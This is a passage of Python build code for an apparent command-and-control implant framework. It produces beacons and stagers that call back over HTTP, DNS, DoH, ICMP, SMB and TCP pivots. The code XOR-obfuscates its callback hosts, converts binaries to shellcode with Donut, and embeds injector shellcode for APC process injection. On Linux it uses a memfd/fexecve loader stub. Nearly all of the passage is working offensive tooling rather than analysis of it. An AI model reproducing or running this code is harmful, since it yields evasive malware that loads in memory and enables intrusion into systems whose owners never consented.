            if len(cfg.tcp_relay_token) != 64:
                raise RuntimeError(
                    "tcp_relay_token must be 64 hex characters "
                    "(32 bytes)")
            try:
                bytes.fromhex(cfg.tcp_relay_token)
            except ValueError:
                raise RuntimeError(
                    "tcp_relay_token must be valid hex")
            env['TC2_TCP_RELAY_TARGET'] = cfg.tcp_relay_target
            env['TC2_TCP_RELAY_TOKEN'] = cfg.tcp_relay_token

        is_parent = bool(
            getattr(cfg, 'smb_relay_pipe', '') or
            getattr(cfg, 'tcp_relay_target', '') or
            getattr(cfg, 'tcp_rev_listen', ''))
        is_child = bool(
            'smb' in modes or 'tcp' in modes or 'tcprev' in modes)
        needs_pivot = is_parent or is_child

        if needs_pivot:
            pivot_path = getattr(cfg, 'pivot_key_path', '')
            if not pivot_path:
                role = []
                if is_parent:
                    role.append('pivot listener')
                if is_child:
                    role.append('pivot client')
                raise RuntimeError(
                    f"this build is a {'/'.join(role)} but "
                    f"pivot_key_path is empty. Every SMB and TCP "
                    f"build needs the engagement-wide pivot "
                    f"keypair. Generate one with `--pivot-key-gen` "
                    f"and pass its path via --pivot-key or "
                    f"pivot_key_path.")
            priv_b64, pub_b64 = _read_pivot_pem(pivot_path)
            if is_parent:
                if not priv_b64:
                    raise RuntimeError(
                        f"pivot key file {pivot_path!r} has no "
                        f"PRIVATE KEY block, but this build is a "
                        f"pivot listener and needs the private "
                        f"half. Regenerate the file with "
                        f"`--pivot-key-gen`.")
                env['TC2_PIVOT_PRIV_KEY_B64'] = priv_b64
            if is_child:
                if not pub_b64:
                    raise RuntimeError(
                        f"pivot key file {pivot_path!r} has no "
                        f"PUBLIC KEY block, but this build is a "
                        f"pivot client and needs the public half. "
                        f"Regenerate the file with "
                        f"`--pivot-key-gen`.")
                env['TC2_PIVOT_PUB_KEY_B64'] = pub_b64

        ecdh_pubkey = cfg.server_ecdh_pubkey_b64

        failover = max(0, int(getattr(
            cfg, 'transport_failover_after', 3)))
        env['TC2_TRANSPORT_FAILOVER_AFTER'] = str(failover)

        if 'dns' in modes or 'doh' in modes:
            if not cfg.dns_domain:
                raise RuntimeError(
                    f"transport_mode includes "
                    f"{'dns' if 'dns' in modes else 'doh'} but "
                    f"dns_domain is empty")
            env['TC2_DNS_DOMAIN'] = cfg.dns_domain

            if profile is not None:
                dns_label = profile.get('dns_label') or {}
                if isinstance(dns_label, dict):
                    for env_key, key in (
                        ('TC2_DNS_VERB_B',             'verb_b'),
                        ('TC2_DNS_VERB_T',             'verb_t'),
                        ('TC2_DNS_VERB_R',             'verb_r'),
                        ('TC2_DNS_PAYLOAD_CHUNK_SIZE', 'payload_chunk_size'),
                    ):
                        val = dns_label.get(key)
                        if val is None:
                            continue

                        env[env_key] = str(val)

        if 'dns' in modes and cfg.dns_resolver:
            env['TC2_DNS_RESOLVER'] = cfg.dns_resolver

        if 'icmp' in modes:
            if cfg.target_os == 'windows':
                raise RuntimeError(
                    "transport_mode 'icmp' is not supported on "
                    "Windows")
            if not getattr(cfg, 'icmp_host', ''):
                raise RuntimeError(
                    "transport_mode includes 'icmp' but icmp_host "
                    "is empty (set it to the C2's public IPv4)")
            env['TC2_ICMP_HOST'] = _obf(cfg.icmp_host)

        if 'doh' in modes:
            if cfg.doh_resolver:
                env['TC2_DOH_RESOLVER'] = _obf(cfg.doh_resolver)
            if cfg.doh_host_header:
                env['TC2_DOH_HOST_HEADER'] = _obf(cfg.doh_host_header)
            if cfg.doh_user_agent:
                env['TC2_DOH_USER_AGENT'] = _obf(cfg.doh_user_agent)

        priv_pem = self._ensure_agent_keypair(cfg)
        if priv_pem:
            encoded = _b64.b64encode(
                priv_pem.encode('utf-8')).decode('ascii')
            env['TC2_AGENT_PRIV_KEY_PEM'] = encoded

        if ecdh_pubkey:
            env['TC2_SERVER_ECDH_PUBKEY'] = ecdh_pubkey

        # inject_method is the build-time default for `migrate
        # <pid>` when the operator does not supply --method. It is
        # emitted unconditionally, including on a build with
        # inject=False, so the default in `agent/src/config.rs` is
        # always overridden by the explicit build config. The
        # runtime refuses `migrate <pid>` on a non-injecting build
        # with the "no injector shellcode" message regardless of
        # which method was named.
        inject_method = (
            getattr(cfg, 'inject_method', '') or 'default')
        if inject_method not in ('default', 'apc',
                                 'threadpool', 'fiber',
                                 'callback'):
            raise RuntimeError(
                f"inject_method must be one of 'default', 'apc', "
                f"'threadpool', 'fiber', 'callback'; got "
                f"{inject_method!r}")
        if inject_method in ('threadpool', 'fiber'):
            raise RuntimeError(
                f"inject_method {inject_method!r} is a "
                f"self-execution technique. Fibers and thread "
                f"pools are process-local and do not fit "
                f"`migrate <pid>`. Use `execmem --method "
                f"{inject_method}` instead, or leave inject_method "
                f"at 'default'.")
        if inject_method == 'callback':
            raise RuntimeError(
                "inject_method 'callback' is not implemented. "
                "The callback technique requires a hijackable "
                "function pointer in the target process and a "
                "per-target implementation. Use 'apc', or leave "
                "inject_method at 'default'.")
        if inject_method == 'apc':
            if cfg.target_os != 'windows':
                raise RuntimeError(
                    f"inject_method 'apc' is Windows-only; got "
                    f"target_os={cfg.target_os!r}. Leave "
                    f"inject_method at 'default' for a Linux build.")
            if not getattr(cfg, 'inject', False):
                raise RuntimeError(
                    "inject_method='apc' requires inject=True; "
                    "the APC backend queues the injector shellcode "
                    "that the injection pass embeds. Without "
                    "inject=True there is no shellcode to queue. "
                    "Set inject=True, or leave inject_method at "
                    "'default'.")
        env['TC2_INJECT_METHOD_DEFAULT'] = inject_method

        return env

    def _build_stager_env_vars(self, cfg: BeaconBuildConfig,
                               profile: Optional[dict] = None) -> Dict[str, str]:
        """Build-time configuration env vars for a stager build.

        The stager is a minimal first-stage implant. It has no
        signing key, no CA, no evasion — its only jobs are check-in,
        fetch the full agent, and execute it in memory. The env var
        set is therefore much smaller than the full agent's.
        """
        import secrets as _secrets
        import base64 as _b64

        obf_key = _secrets.token_bytes(16)

        def _obf(s: str) -> str:
            raw = s.encode('utf-8')
            xored = bytes(b ^ obf_key[i % len(obf_key)]
                          for i, b in enumerate(raw))
            return _b64.b64encode(xored).decode('ascii')

        stage_name = (getattr(cfg, 'stage_name', '') or '').strip()
        if not stage_name:
            raise RuntimeError(
                'stager builds require --stage-name (or stage_name '
                'in the JSON config): the AES key is recorded '
                'against this name so the server can find it when '
                'it serves the payload. Set it to the payload file '
                'stem, e.g. "full" for payloads/full.bin.')

        if not cfg.url.startswith('https://'):
            raise RuntimeError(
                f'stager builds require an https:// URL; got '
                f'{cfg.url!r}. A plaintext callback lets a network '
                f'observer substitute the payload. Change url to an '
                f'https:// address.')

        stager_modes = [m.strip().lower()
                        for m in (cfg.transport_mode or 'http').split(',')
                        if m.strip()]
        if stager_modes != ['http']:
            raise RuntimeError(
                f"stagers support only transport_mode='http'; "
                f"got {cfg.transport_mode!r}. A non-HTTP stager "
                f"is not implemented — build a full agent for "
                f"dns, doh, icmp, smb, or tcp, and stage it "
                f"separately.")

        env: Dict[str, str] = {
            'TC2_OBF_KEY_HEX':        obf_key.hex(),
            'TC2_DEFAULT_URL':        _obf(cfg.url),
            'TC2_KILL_DAYS':          str(cfg.kill_days),
            'TC2_DEFAULT_SLEEP':      '5',
            'TC2_STAGE_NAME':         _obf(stage_name),
            'TC2_TLS_PROFILE':        cfg.tls_profile,
            'TC2_WORK_HOURS_START':   cfg.work_hours_start,
            'TC2_WORK_HOURS_END':     cfg.work_hours_end,
            'TC2_SERVER_ECDH_PUBKEY': cfg.server_ecdh_pubkey_b64,
        }

        stager_identity_role = (
            getattr(cfg, 'identity_role', '') or '').strip()
        if stager_identity_role:
            env['TC2_IDENTITY_ROLE'] = stager_identity_role

        if profile is not None:
            if profile.get('shaping'):
                print(f"[build] shaping block from "
                      f"{profile.get('name', '?')!r} embedded in "
                      f"the stager; checkin and tasks responses "
                      f"will be unwrapped")
            merged = dict(profile)
            for key in ('beacon_path', 'tasks_path',
                        'results_path', 'request_headers'):
                if key in merged:
                    continue
                c2 = merged.get('c2') or {}
                if key in c2:
                    merged[key] = c2[key]
            env['TC2_PROFILE_JSON'] = _obf(json.dumps(merged))

        key_hex = getattr(cfg, 'stage_key_hex', '') or \
            _secrets.token_bytes(32).hex()
        env['TC2_STAGE_KEY_HEX'] = key_hex
        self._write_stage_key(stage_name, key_hex)

        if cfg.server_pubkey_path:
            try:
                with open(cfg.server_pubkey_path, 'rb') as fh:
                    pem_bytes = fh.read()
                env['TC2_SERVER_PUBKEY_PEM'] = _b64.b64encode(pem_bytes).decode('ascii')
            except OSError as exc:
                print(f"[build] warning: cannot read server pubkey "
                      f"at {cfg.server_pubkey_path}: {exc} — the "
                      f"stager will not verify payload signatures")
        else:
            print("[build] warning: no server public key staged for "
                  "this stager build — payload signature verification "
                  "will be disabled on the target. Restart the "
                  "handler with a working ECDSA signer.")

        if cfg.root_ca_path:
            try:
                with open(cfg.root_ca_path, 'rb') as fh:
                    pem = fh.read()
                env['TC2_ROOT_CA_PEM'] = _b64.b64encode(pem).decode('ascii')
            except OSError:
                pass

        if cfg.verbose:
            env['TC2_VERBOSE'] = 'true'

        return env

    def _write_stage_key(self, name: str, key_hex: str) -> None:
        """Record the AES-256 key a stager was built with.

        The server reads payloads/stage_keys.json to know which key
        to encrypt a given payload under, so the stager on the
        target can decrypt it. Written atomically so a concurrent
        read never sees a half-file.

        The file is a bearer secret — it is the key to every staged
        payload. Permissions are 0600 for that reason; a world-
        readable stage_keys.json is a finding on any engagement.
        """
        import json as _json
        import os as _os

        path = 'payloads/stage_keys.json'
        _os.makedirs(_os.path.dirname(path) or '.', exist_ok=True)

        data = {}
        if _os.path.isfile(path):
            try:
                with open(path, 'r', encoding='utf-8') as fh:
                    loaded = _json.load(fh)
                if isinstance(loaded, dict):
                    data = loaded
            except (OSError, ValueError):
                data = {}
        data[name] = key_hex

        tmp = path + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as fh:
            _json.dump(data, fh, indent=2, sort_keys=True)
        try:
            _os.chmod(tmp, 0o600)
        except OSError:
            pass
        _os.replace(tmp, path)

    def _ensure_agent_keypair(self, cfg: BeaconBuildConfig) -> str:
        """Return the agent's private key PEM, generating it on first
        use. The public half is not embedded — the agent sends it to the
        server at check-in and the server pins it per session."""
        if cfg.agent_keypair_path and os.path.exists(cfg.agent_keypair_path):
            with open(cfg.agent_keypair_path, 'r') as f:
                return f.read()

        try:
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives import serialization
        except ImportError:
            return ''

        priv = ec.generate_private_key(ec.SECP256R1())
        priv_pem = priv.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption(),
        ).decode('ascii')

        if cfg.agent_keypair_path:
            os.makedirs(
                os.path.dirname(cfg.agent_keypair_path) or '.',
                exist_ok=True)
            with open(cfg.agent_keypair_path, 'w') as f:
                f.write(priv_pem)

        return priv_pem

    def _output_name(self, cfg: BeaconBuildConfig) -> str:
        modes = [m.strip() for m in
                 (cfg.transport_mode or 'http').split(',')
                 if m.strip()]
        slug = '-'.join(modes) if modes else 'http'

        prefix = ('stager' if cfg.output_format == 'stager'
                  else 'beacon')
        stem = (f"{prefix}_{cfg.target_os}_{slug}"
                f"_{cfg.target_arch}")

        ext = {
            'exe':       '.exe' if cfg.target_os == 'windows' else '',
            'dll':       '.dll',
            'elf':       '',
            'shellcode': '.exe' if cfg.target_os == 'windows' else '',
            'stager':    '.exe' if cfg.target_os == 'windows' else '',
        }.get(cfg.output_format, '')
        return stem + ext

    def _rebuild_with_injector(self, cfg: BeaconBuildConfig,
                               profile: Optional[dict],
                               env: dict, out: str) -> str:
        """Second pass: embed the injector shellcode and rebuild.

        Dispatches on target_os. Windows wraps the pass-1 PE with
        Donut. Linux prepends a vendored ELF-loader stub to the
        pass-1 ELF. Both end with the same rebuild dance: set
        cfg.injector_shellcode_b64, rebuild into a .pass2 path,
        atomically replace `out`, restore the config.
        """
        if cfg.target_os == 'windows':
            return self._rebuild_with_injector_windows(
                cfg, profile, env, out)
        if cfg.target_os == 'linux':
            return self._rebuild_with_injector_linux(
                cfg, profile, env, out)
        return out

    def _rebuild_with_injector_windows(self, cfg: BeaconBuildConfig,
                                       profile: Optional[dict],
                                       env: dict, out: str) -> str:
        """Two-pass build for injection-enabled Windows agents.

        Pass 1 (already complete when this method is called)
        produced a PE that runs as a full beacon but has no
        injector payload. This method:

          1. Runs Donut on that PE to produce shellcode.
          2. Writes the shellcode to a temp file.
          3. Rebuilds with `TC2_INJECTOR_SHELLCODE_PATH` pointing
             at that file; `build.rs` reads it and `include_bytes!`s
             it into the second-pass binary.
          4. Replaces the pass-1 output with the pass-2 binary.

        The two passes are functionally equivalent beacons.
        Only the second is shipped. They differ in that pass 2
        has the pass-1 binary (as shellcode) embedded in it via
        `build.rs` and `include_bytes!`. The
        self-reference this implies is unavoidable: pass 2's
        binary would have to contain a copy of itself for the
        embedded shellcode to be byte-identical to the parent,
        and that is not possible to construct.

        Practical consequence: an operator who runs `migrate
        <pid>` from the parent injects the pass-1 beacon. That
        injected beacon is a fully functional agent that can run
        every verb including `migrate --self`, but *not*
        `migrate <pid>` — its embedded shellcode is empty. If
        the operator needs the injected copy to inject further,
        the on-demand shellcode path (server caches the wrapped
        PE and streams it as a task argument) is the fix.
        """
        donut = self._find_donut()
        if donut is None:
            print('[build] warning: injection requested but '
                  'Donut was not found on PATH and no vendored '
                  'copy exists at beacon/bin/donut. The built '
                  'agent will support `migrate --self` only; '
                  '`migrate <pid>` will refuse at runtime. '
                  'Download Donut from '
                  'https://github.com/TheWover/donut/releases')
            return out

        import tempfile
        with tempfile.TemporaryDirectory() as td:
            sh_path = os.path.join(td, 'injector.bin')

            if cfg.target_arch == 'amd64':
                arch_flag = '2'
            elif cfg.target_arch == '386':
                arch_flag = '1'
            else:
                print(f'[build] warning: injection requires '
                      f'target_arch amd64 or 386; got '
                      f'{cfg.target_arch!r}. The built agent will '
                      f'support `migrate --self` only.')
                return out

            try:
                r = subprocess.run(
                    [donut, '-f', '1', '-a', arch_flag,
                     '-i', out, '-o', sh_path],
                    capture_output=True)
            except OSError as exc:
                print(f'[build] warning: cannot execute Donut at '
                      f'{donut!r}: {exc}. On an arm64 host this is '
                      f'usually an amd64 Donut binary without a '
                      f'registered binfmt_misc handler. The built '
                      f'agent will support `migrate --self` only.')
                return out
            if r.returncode != 0:
                err = (r.stderr or r.stdout or b'').decode(
                    'utf-8', 'replace').strip()
                print(f'[build] warning: Donut failed on the '
                      f'pass-1 PE: {err or "unknown error"}. '
                      f'The built agent will support '
                      f'`migrate --self` only.')
                return out

            with open(sh_path, 'rb') as fh:
                shellcode_b64 = base64.b64encode(
                    fh.read()).decode('ascii')

        size_mb = (len(shellcode_b64) * 3 // 4) / (1024 * 1024)
        print(f'[build] injection enabled: running second pass '
              f'(embedded shellcode is {size_mb:.1f} MB)')

        import tempfile
        sh_file = tempfile.NamedTemporaryFile(
            mode='wb', suffix='.bin', delete=False)
        try:
            sh_file.write(base64.b64decode(shellcode_b64))
            sh_file.close()
            inject_env = {**env, 'TC2_INJECTOR_SHELLCODE_PATH': sh_file.name}
            tmp_out = out + '.pass2'
            cmd = self._build_command(cfg)
            subprocess.run(cmd, env=inject_env, cwd=self.agent_dir,
                           check=True)
            self._copy_artifact(cfg, tmp_out)
            os.replace(tmp_out, out)
        finally:
            try:
                os.unlink(sh_file.name)
            except OSError:
                pass

        final_mb = os.path.getsize(out) / (1024 * 1024)
        print(f'[build] injection enabled: final binary is '
              f'{final_mb:.1f} MB')
        return out

    def _rebuild_with_injector_linux(self, cfg: BeaconBuildConfig,
                                     profile: Optional[dict],
                                     env: dict, out: str) -> str:
        """Linux second pass.

        Reads the pass-1 ELF, prepends the vendored ELF-loader
        stub, writes the concatenation to a temp file, and rebuilds
        with `TC2_INJECTOR_SHELLCODE_PATH` pointing at it.

        The stub is a fixed blob at beacon/bin/
        inject_linux_stub.bin. Its contract with
        `agent/src/inject_linux.rs`: it is position-independent, it
        locates the ELF that immediately follows it in the mapped
        region, writes that ELF into a memfd, and fexecve()s the
        descriptor.

        Donut is not consulted — it emits PE loaders, not ELF
        loaders. The stub is architecture-specific and is
        vendored pre-assembled so the build does not require
        nasm or a C compiler.

        Architecture gate. The vendored stub is x86-64. On any
        other target_arch the concatenation produces a binary
        that looks correct on disk but dies on the first illegal
        instruction the moment `migrate <pid>` fires. Refuse the
        injection pass here rather than emitting a silently
        broken binary — the operator gets `migrate --self` only,
        which is the same outcome as leaving `inject` unset.
        """
        if cfg.target_arch != 'amd64':
            print(f'[build] warning: Linux in-memory injection is '
                  f'x86-64 only; the vendored loader stub will not '
                  f'run on {cfg.target_arch!r}. The built agent will '
                  f'support `migrate --self` only.')
            return out

        stub_path = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            'bin', 'inject_linux_stub.bin')
        if not os.path.exists(stub_path):
            print(f'[build] warning: injection requested but the '
                  f'Linux loader stub was not found at '
                  f'{stub_path}. The built agent will support '
                  f'`migrate --self` only; `migrate <pid>` will '
                  f'refuse at runtime. See the note in '
                  f'agent/src/inject_linux.rs for how to build '
                  f'the stub.')
            return out

        with open(stub_path, 'rb') as fh:
            stub = fh.read()
        if not stub:
            print(f'[build] warning: Linux loader stub at '
                  f'{stub_path} is empty; skipping the '
                  f'injection pass.')
            return out

        with open(out, 'rb') as fh:
            elf_bytes = fh.read()

        shellcode = stub + elf_bytes
        shellcode_b64 = base64.b64encode(shellcode).decode('ascii')

        stub_kb = len(stub) // 1024
        elf_mb = len(elf_bytes) / (1024 * 1024)
        print(f'[build] injection enabled: running second pass '
              f'(stub {stub_kb} KB + ELF {elf_mb:.1f} MB = '
              f'{len(shellcode) / (1024 * 1024):.1f} MB embedded)')

        import tempfile
        sh_file = tempfile.NamedTemporaryFile(
            mode='wb', suffix='.bin', delete=False)
        try:
            sh_file.write(stub + elf_bytes)
            sh_file.close()
            inject_env = {**env, 'TC2_INJECTOR_SHELLCODE_PATH': sh_file.name}
            tmp_out = out + '.pass2'
            cmd = self._build_command(cfg)
            subprocess.run(cmd, env=inject_env, cwd=self.agent_dir,
                           check=True)
            self._copy_artifact(cfg, tmp_out)
            os.replace(tmp_out, out)
        finally:
            try:
                os.unlink(sh_file.name)
            except OSError:
                pass

        final_mb = os.path.getsize(out) / (1024 * 1024)
        print(f'[build] injection enabled: final binary is '
              f'{final_mb:.1f} MB')
        return out

    def _find_donut(self) -> Optional[str]:
        """Return the path to a Donut binary, or None.

        Search order matches _convert_to_shellcode: PATH first,
        then a vendored copy at beacon/bin/donut. Centralised so
        the shellcode output path and the injection path cannot
        drift.
        """
        donut = shutil.which('donut')
        if donut:
            return donut
        vendored = os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            'bin', 'donut')
        if os.name == 'nt':
            vendored += '.exe'
        if os.path.exists(vendored):
            return vendored
        return None

    def _convert_to_shellcode(self, cfg: BeaconBuildConfig,
                              path: str) -> str:
        """Wrap the compiled PE in a Donut stub.

        Donut produces position-independent shellcode that loads the
        wrapped PE into its own allocated memory, resolves imports,
        and executes. The result can be delivered through any loader
        that accepts raw shellcode — BOF, macro, PowerShell,
        DLL sideload, or a stager.

        Tries, in order:
          1. A local `donut` binary on PATH.
          2. A vendored `donut` binary at beacon/bin/donut.
        """
        donut = self._find_donut()
        if donut is None:
            raise RuntimeError(
                'shellcode output requires the Donut binary on PATH, '
                'or a vendored copy at beacon/bin/donut. '
                'Download from: https://github.com/TheWover/donut/releases'
            )

        base, _ = os.path.splitext(path)
        out = base + '.bin'

        arch_flag = {
            'amd64': '2',
            '386':   '1',
        }.get(cfg.target_arch)
        if arch_flag is None:
            raise RuntimeError(
                f'shellcode output is not supported for '
                f'architecture {cfg.target_arch!r}; '
                f'Donut emits x86 and amd64 only')

        cmd = [
            donut,
            '-f', '1',
            '-a', arch_flag,
            '-o', out,
            path,
        ]
        try:
            subprocess.run(cmd, check=True)
        except OSError as exc:
            raise RuntimeError(
                f'cannot execute Donut at {donut!r}: {exc}. On an '
                f'arm64 host this is usually an amd64 Donut '
                f'binary without a registered binfmt_misc '
                f'handler. Install a native Donut for this host, '
                f'or run the build on a host whose architecture '
                f'matches the Donut binary.'
            ) from exc
        # Verify the output exists.
        if not os.path.exists(out):
            raise RuntimeError(f'donut did not produce {out}')
        return out